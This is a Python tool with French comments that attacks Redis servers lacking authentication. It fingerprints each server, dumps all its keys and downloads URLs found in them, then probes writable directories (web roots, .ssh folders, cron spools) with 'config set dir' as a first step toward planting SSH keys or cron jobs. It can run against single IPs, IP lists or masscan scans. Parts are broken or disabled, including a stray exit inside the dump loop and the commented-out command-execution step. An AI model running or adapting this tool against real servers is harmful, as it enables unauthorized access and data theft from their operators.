#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nom du code : Gestionnaire de serveurs Redis non authentifiés
Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité.
              Il cherche des répertoires vulnérables et exécute des commandes via SSH.
Auteur      : ZarTek-Creole
Date        : 06-12-23
"""

import argparse
import base64
import datetime
import logging
import os
import re
import subprocess
import sys
import time
from typing import List, Tuple

import redis
import requests


class RedisConfig:
    CLI_PATHS = ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']
    DEFAULT_PORT = '6379'
    DEFAULT_USER = 'root'
    DEFAULT_SSH_KEY = 'id_ed25519.pub'
    DEFAULT_TIMEOUT = 5
    VULNERABLE_DIRECTORIES = [
        "/usr/share/nginx/html", "/var/www/html", "/var/www/phpMyAdmin",
        "/home/redis/.ssh", "/var/lib/redis/.ssh",
        "/var/spool/cron/crontabs", "/var/spool/cron",
        "/home"
    ]
    REGEXP_URI = re.compile(
        r"https?://[^\s/$.?#].[^\s]*"
    )
    REGEXP_BASE64 = re.compile(r'echo\s(.*?)\|base64\s-d')


class ExitOnErrorHandler(logging.StreamHandler):
    def emit(self, record: logging.LogRecord):
        super().emit(record)
        if record.levelno >= logging.ERROR:
            sys.exit(1)


def configure_logging(is_verbose: bool):
    logging.basicConfig(
        format="[%(levelname)s] %(message)s",
        level=logging.DEBUG if is_verbose else logging.INFO,
        handlers=[ExitOnErrorHandler()]
    )


class FileHandler:
    @staticmethod
    def read_lines(file_path: str) -> List[str]:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.readlines()

    @staticmethod
    def write_lines(file_path: str, lines: List[str]):
        with open(file_path, 'w', encoding='utf-8') as file:
            file.writelines(lines)

    @staticmethod
    def write_binary(file_path: str, data: bytes):
        with open(file_path, 'wb') as file:
            file.write(data)


class RedisUtility:
    def __init__(self, ip_address: str, port: int, binary_redis: str):
        self.ip_address = ip_address
        self.port = port
        self.binary_redis = binary_redis

    @staticmethod
    def decode_base64(text: str) -> str:
        try:
            return base64.b64decode(text.encode('utf-8')).decode('utf-8').replace('\n', ' ')
        except Exception:
            return text

    @staticmethod
    def replace_base64(match):
        base64_command = match.group(1)
        decoded_command = RedisUtility.decode_base64(base64_command)
        return f'echo {decoded_command}' if decoded_command != base64_command else match.group(0)

    @staticmethod
    def decode_and_replace_base64(text: str) -> str:
        return RedisConfig.REGEXP_BASE64.sub(RedisUtility.replace_base64, text)

    @staticmethod
    def extract_variables(lines: List[str]) -> dict:
        variables = {}
        for line in lines:
            if '=' in line and '$(' in line and ')' in line:
                var_name, var_value = line.split('=', 1)
                var_value = var_value.strip()
                if var_value.startswith('$(') and var_value.endswith(')'):
                    var_value = var_value[2:-1]
                variables[var_name.strip()] = var_value
        return variables

    def replace_variables_and_urls(self, file_path: str):
        lines = FileHandler.read_lines(file_path)
        variables = self.extract_variables(lines)

        for i, line in enumerate(lines):
            for var_name, var_value in variables.items():
                line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")
            if 'echo ' in line and '|base64 -d' not in line:
                potential_urls = RedisConfig.REGEXP_URI.findall(line)
                for url in potential_urls:
                    line = line.replace(f'echo {url}', url)
            lines[i] = line

        FileHandler.write_lines(file_path, lines)

    def redis_get_dump_parser(self, key_value: str) -> str:
        return self.decode_and_replace_base64(key_value) if "base64 -d" in key_value else key_value

    @staticmethod
    def download_file(url: str, file_path: str) -> bool:
        response = requests.get(url)
        if response.status_code == 200:
            FileHandler.write_binary(file_path, response.content)
            logging.info(f"File downloaded from {url} and saved as {file_path}")
            return True
        else:
            logging.info(f"Failed to download from {url}, HTTP status {response.status_code}")
            return False

    def download_and_replace_lines(self, url: str, original_file_path: str, modified_file_path: str):
        if self.download_file(url, original_file_path):
            self.replace_variables_and_urls(modified_file_path)

    def redis_get_dump_parser_url(self, key_value: str, path: str):
        urls = RedisConfig.REGEXP_URI.findall(key_value)
        for url in urls:
            file_name = os.path.basename(url)
            original_file_path = os.path.join(path, file_name)
            modified_file_path = os.path.join(path, f"modified_{file_name}")
            self.download_and_replace_lines(url, original_file_path, modified_file_path)


    def redis_get_modules(self) -> Tuple[bool, str]:
        success, serveur_message = self.execute_command_redis(["MODULE", "LIST"])
        if success and serveur_message is not '':
            logging.info("List des modules : %s", serveur_message)
            return True, serveur_message
        logging.debug("List des modules : Aucun module trouvé")
        return False, "Aucun module trouvé"

    def redis_get_dump(self) -> Tuple[bool, str]:
        if not os.path.isdir("dumps"):
            os.mkdir("dumps")
            logging.info("Created 'dumps' directory in the current directory.")
        redis_conn = redis.StrictRedis(self.ip_address, self.port, db=0)
        dbs = redis_conn.info('keyspace').keys()
        for db in dbs:
            db_number = int(db[2:])
            print(db_number)
            rdb_filename = f'db_{self.ip_address}_{db_number}.rdb'
            redis_conn.select(db_number)
            redis_conn.bgsave(rdb_filename)
            sys.exit(0)
            while redis_conn.info("persistence")["rdb_bgsave_in_progress"]:
                time.sleep(1)
            logging.info(f"Database {db_number} exported to {rdb_filename}")

            keys = redis_conn.keys("*")
            dump_path = os.path.join("dumps", f"{self.ip_address}")
            os.makedirs(dump_path, exist_ok=True)
            for key in keys:
                key_data = self.redis_get_dump_parser(redis_conn.get(key).decode("utf-8"))
                self.redis_get_dump_parser_url(key_data, dump_path)
                FileHandler.write_lines(os.path.join(dump_path, f"{key}.dump"), [key_data])
                logging.info(f"Key {key} exported")

        redis_conn.close()
        return True, "OK"

    def execute_command_redis(self, redis_command: List[str]) -> Tuple[bool, str]:
        logging.debug("Redis execute_command: %s", redis_command)
        command = [self.binary_redis, "-h", self.ip_address, "-p", str(self.port)] + redis_command
        success, stdout_output, stderr_output = self.execute_command(command)
        return (True, stdout_output) if success else (False, stderr_output)

    @staticmethod
    def execute_command(command: List[str]) -> Tuple[bool, str, str]:
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
            )
            stdout, stderr = process.communicate()
            return (True, stdout.strip(), stderr.strip()) if process.returncode == 0 else (False, stdout.strip(), stderr.strip())
        except subprocess.CalledProcessError as e:
            return False, "", str(e)
        except Exception as e:
            return False, "", str(e)


class RedisServerManager:
    def __init__(
        self,
        ip_address: str,
        port: str = RedisConfig.DEFAULT_PORT,
        user: str = RedisConfig.DEFAULT_USER,
        ssh_key: str = RedisConfig.DEFAULT_SSH_KEY,
        timeout: int = RedisConfig.DEFAULT_TIMEOUT
    ):
        self.ip_address = ip_address
        self.port = port
        self.user = user
        self.ssh_key = ssh_key
        self.ssh_key_private = self._derive_ssh_key_private(ssh_key)
        self.timeout = timeout
        self.directory_path = self._determine_directory_path(user)
        self.binary_redis = self._check_binary()
        self.redis_utility = RedisUtility(ip_address, port, self.binary_redis)

    @staticmethod
    def _derive_ssh_key_private(ssh_key: str) -> str:
        return ssh_key.rstrip('.pub')

    @staticmethod
    def _determine_directory_path(user: str) -> str:
        return '/root/.ssh/' if user == "root" else f'/home/{user}/.ssh/'

    def _check_binary(self) -> str:
        self._validate_ssh_keys()
        self._validate_ssh_client()
        return self._find_redis_cli()

    def _validate_ssh_keys(self):
        if not os.path.isfile(self.ssh_key) or not os.path.isfile(self.ssh_key_private):
            error_message = "Les clés SSH spécifiées n'existent pas. Assurez-vous d'avoir fourni le bon chemin.\n"
            error_message += "Pour générer une clé SSH : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
            logging.error(error_message)
            raise FileNotFoundError(f"Les clés SSH '{self.ssh_key}' et '{self.ssh_key_private}' n'existent pas.")

    @staticmethod
    def _validate_ssh_client():
        """
        Vérifie si le client SSH est installé.
        Raises:
            EnvironmentError: Si le client SSH n'est pas installé.
        """
        try:
            subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError as exc:
            logging.error("Le client SSH n'est pas installé.")
            raise EnvironmentError("Le client SSH n'est pas installé. Veuillez installer un client SSH (ex. : 'apt install openssh-client').") from exc

    def _find_redis_cli(self) -> str:
        for path in RedisConfig.CLI_PATHS:
            if os.path.isfile(path):
                return path
        logging.error("Le client Redis n'est pas installé.")
        raise EnvironmentError("Le client Redis n'est pas installé. Veuillez installer un client Redis (ex. : 'apt install redis-tools').")

    def process_server(self) -> Tuple[bool, str]:
        logging.info(
            "Tentative de connexion à %s:%s avec l'utilisateur %s et la clé SSH '%s' "
            "(timeout %s sec) écriture dans %s",
            self.ip_address,
            self.port,
            self.user,
            self.ssh_key,
            self.timeout,
            self.directory_path,
        )
        success, msg = self.redis_get_banner()

        if not success:
            return False, msg
        success, msg = self.redis_utility.redis_get_modules()

        if not success:
            return False, msg
        success, msg = self.redis_utility.redis_get_dump()
        if not success:
            return False, msg

        success, msg = self.find_vulnerable_directory()
        if not success:
            return False, "Aucun répertoire vulnérable trouvé."
        # logging.debug(
        #     "Répertoire vulnérable trouvé : %s" if success else msg, self.directory_path
        # )
        # if not success:
        #     return False, msg
        # return self.execute_redis_commands()
        return True, "Finished"

    def redis_get_banner(self) -> Tuple[bool, str]:
        success, data = self.redis_utility.execute_command_redis(["INFO"])
        if not success:
            return False, data
        redis_version = re.search(r"redis_version:(.*?)\n", data).group(1)
        redis_os = re.search(r"os:(.*?)\n", data).group(1)
        redis_role = re.search(r"role:(.*?)\n", data).group(1)

        uptime_in_seconds = int(re.search(r"uptime_in_seconds:(\d+)\n", data).group(1))
        # Créez un objet timedelta à partir du nombre d'uptime en secondes
        uptime_timedelta = datetime.timedelta(seconds=uptime_in_seconds)

        # Convertissez la durée en une chaîne lisible
        uptime_str = str(uptime_timedelta)

        used_memory = int(re.search(r"used_memory:(\d+)\n", data).group(1))
        total_connections_received = int(
            re.search(r"total_connections_received:(\d+)\n", data).group(1)
        )
        total_commands_processed = int(
            re.search(r"total_commands_processed:(\d+)\n", data).group(1)
        )

        # Afficher les valeurs extraites
        logging.info(f"Redis Version: {redis_version}")
        logging.info(f"Redis Operating System: {redis_os}")

        logging.info(f"Redis Role: {redis_role}")

        # Affichez la durée
        logging.info(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})")
        logging.info(f"Used Memory: {used_memory} bytes")
        logging.info(f"Total Connections Received: {total_connections_received}")
        logging.info(f"Total Commands Processed: {total_commands_processed}")
        return True, "OK"

    def find_vulnerable_directory(self) -> Tuple[bool, str]:
        for directory in RedisConfig.VULNERABLE_DIRECTORIES:
            if self.test_directory(directory):
                self.directory_path = directory
                return True, f"Répertoire vulnérable trouvé : {directory}"
        return False, "Aucun répertoire vulnérable trouvé."

    def test_directory(self, directory: str) -> bool:
        logging.debug("Test directory : %s", directory)
        command = [
            "config",
            "set",
            "dir",
            directory
        ]
        success, server_message = self.redis_utility.execute_command_redis(command)
        if server_message.startswith("ERR "):
            return False
        logging.info("--------------------- %s-------------------- %s", server_message, command)
        return success

    def execute_command(self, command: List[str]) -> Tuple[bool, str, str]:
        logging.debug("Commande execute_command: %s", command)
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
            )
            stdout, stderr = process.communicate(timeout=float(self.timeout))
            if process.returncode == 0:
                return True, stdout.strip(), stderr.strip()
            else:
                return False, "Erreur : %s" % stderr.strip(), stdout.strip()
        except subprocess.TimeoutExpired as timeout_error:
            return (
                False,
                "Le délai de la commande a expiré après %s secondes." % self.timeout,
                str(timeout_error),
            )
        except OSError as os_error:
            return False, "Erreur : %s" % str(os_error), str(os_error)

    def _check_redis_result(
        self, result: subprocess.CompletedProcess
    ) -> Tuple[bool, str]:
        if result.returncode != 0:
            return False, result.stderr.strip()
        return True, "Commande exécutée avec succès."


def execute_ssh_command(self) -> Tuple[bool, str]:
    ssh_command = self.build_ssh_command()
    logging.debug("Commande SSH : %s", ssh_command)
    success, stdout_output, stderr_output = self.execute_command(ssh_command)
    if success:
        logging.info("Commande réussie. Sortie standard : %s", stdout_output)
        return True, "Commande exécutée avec succès."
    else:
        logging.info("Erreur : %s", stderr_output)
        return False, stderr_output

    def build_ssh_command(self) -> List[str]:
        return [
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "ConnectTimeout=%s" % self.timeout,
            "-o",
            "PasswordAuthentication=no",
            "-i",
            self.ssh_key,
            "%s@%s" % (self.user, self.ip_address),
        ]


def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int):
    with open(file_path, "r", encoding="utf-8") as file:
        for ip_address in file:
            ip_address = ip_address.strip()
            if ip_address:
                manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
                success, message = manager.process_server()
                logging.info(
                    "IP %s - Résultat : %s, Message : %s", ip_address, success, message
                )


def process_scan(scan: str, port: str, user: str, ssh_key: str, timeout: int):
    # scan par zgrab2

    # on verifie la presence de golang
    try:
        subprocess.run(["masscan", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except subprocess.CalledProcessError:
        logging.error("Le client masscan n'est pas installé. Veuillez installer un client masscan (ex. : 'apt install masscan').")

        # manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
        # success, message = manager.process_server()
        # logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Gestionnaire de serveurs Redis non authentifiés", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-i', '--ip', help="Adresse IP du serveur Redis")
    parser.add_argument('-f', '--file', help="Chemin du fichier contenant les adresses IP")
    parser.add_argument('-sc', '--scan', help="Scan des adresses IP")
    parser.add_argument('-b', '--banner', action='store_true', help="Afficher la bannière")
    parser.add_argument('-p', '--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
    parser.add_argument('-u', '--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur SSH pour la connexion")
    parser.add_argument('-s', '--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin du fichier de clé SSH")
    parser.add_argument('-t', '--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Délai de connexion")
    parser.add_argument('-v', '--verbose', action='store_true', help="Augmenter la verbosité des logs")
    args = parser.parse_args()

    if not (args.ip or args.file):
        parser.print_help()
        sys.exit(1)

    return args


def main():
    args = parse_arguments()
    configure_logging(args.verbose)

    if not (args.ip or args.file or args.scan):
        logging.warning(
            "Aucune adresse IP ou chemin de fichier spécifié. "
            "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
            "'-f' pour spécifier un fichier contenant des adresses IP. "
            "'-sc' pour scanner les adresses IP. "
            "Utilisez '--help' pour plus d'informations."
        )
    elif args.ip:
        manager = RedisServerManager(
            args.ip, args.port, args.user, args.sshKey, args.timeout
        )
        success, message = manager.process_server()
        logging.info("IP %s - Résultat : %s, Message : %s", args.ip, success, message)
    elif args.scan:
        process_scan(args.scan, args.port, args.user, args.sshKey, args.timeout)
    else:
        process_file(args.file, args.port, args.user, args.sshKey, args.timeout)


if __name__ == "__main__":
    main()
